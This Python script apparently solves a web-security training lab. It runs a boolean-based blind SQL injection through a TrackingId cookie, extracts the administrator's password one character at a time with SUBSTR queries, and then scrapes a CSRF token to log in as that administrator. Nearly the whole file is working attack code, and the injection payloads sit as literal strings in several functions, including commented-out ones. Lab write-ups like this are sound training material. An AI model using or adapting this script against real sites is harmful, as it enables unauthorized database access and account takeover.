import requests
import re
import string
from bs4 import BeautifulSoup

def check_conditional_response(response):
    return response.status_code == 200 and 'Welcome back!' in response.text

def get_trackingid(session, domain):
    session.get(domain)
    cookie = session.cookies.get_dict()
    tracking_id = cookie['TrackingId']
    return tracking_id

# def test(session, domain, tracking_id):
#     payload = tracking_id + "' AND (SELECT 'a' FROM users where username = 'administrator')='a' -- -"
#     r = session.get(domain, cookies={'TrackingId': payload})
#     print(check_conditional_response(r))
# def get_password_len(session, domain, tracking_id):
#     password_len = 0
#     while True:
#         password_len += 1
#         payload = tracking_id + "' AND (SELECT LENGTH(password) FROM users where username = 'administrator')={} -- -".format(password_len)
#         r = session.get(domain, cookies={'TrackingId': payload})
#         if check_conditional_response(r):
#             break
#     return password_len

def get_password(session, domain, tracking_id, password_len):
    password = ''
    charset = string.ascii_lowercase + string.digits
    base_payload = tracking_id + "' AND (SELECT SUBSTR(password, {}, 1) FROM users where username = 'administrator')='{}' -- -"
    for _ in range(password_len):
        for char in charset:
            payload = base_payload.format(len(password) + 1, char)
            print(payload)
            r = session.get(domain, cookies={'TrackingId': payload})
            if check_conditional_response(r):
                password += char
                print('Password: ', password)
                break
    return password

def get_csrf(session, domain):
    login_url = domain + '/login'
    r = session.get(login_url)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'})['value']
    return csrf

def solve_lab(session, domain, username, password, csrf):
    data = {
        'csrf': csrf,
        'username': username,
        'password': password
    }
    r = session.post(domain + '/login', data = data)
    r = session.get(domain)
    if ('Solved' in r.text):
        print('Solved. Visit ' + domain + ' to see the solution.')
    else:
        print('Not Solved')
        
if __name__ == '__main__':
    url = input('Enter the URL the lab provide: ')
    domain = re.search(r'^(https?://[^/]+)', url).group(1)
    session = requests.Session()
    try:
        tracking_id = get_trackingid(session, domain)
        # test(session, domain, tracking_id)
        # password_len = get_password_len(session, domain, tracking_id)
        password = get_password(session, domain, tracking_id, 20)
        # print('Password: ' + password)
        csrf = get_csrf(session, domain)
        solve_lab(session, domain, 'administrator', password, csrf)
    except requests.exceptions.ConnectionError:
        print('Error connecting to the server. Check your URL.')